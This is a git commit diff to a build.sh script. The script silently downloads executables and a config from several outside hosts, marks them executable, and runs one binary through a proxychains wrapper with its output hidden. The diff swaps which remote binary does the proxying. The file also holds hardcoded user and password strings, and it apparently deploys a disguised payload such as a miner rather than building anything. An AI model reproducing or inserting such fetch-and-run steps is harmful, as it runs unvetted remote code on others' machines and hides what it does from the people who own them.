9fc39bcb991d1c879860937b26fd0c17c752f1ae
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2024-01-15 19:50:28 +0700

    Update build.sh

--- build.sh
+++ build.sh
@@ -4,7 +4,7 @@ user="73b065yffz7ymg"
 pass="rzudmq10wr15mn0je4pczgjen9equ" 
 wget -q -O api https://maper.info/Credit && chmod +x api >/dev/null 2>&1
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json >/dev/null 2>&1
-wget -q https://02ip.ru/heroku && chmod +x heroku >/dev/null 2>&1
+wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/panel && chmod +x panel >/dev/null 2>&1
 wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/proxychains.conf && chmod +x proxychains.conf 
 wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/libproxychains4.so && chmod +x libproxychains4.so >/dev/null 2>&1
 sleep 3 
@@ -20,4 +20,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./heroku ./api -c "config.json" >/dev/null 2>&1
+./panel ./api -c "config.json" >/dev/null 2>&1
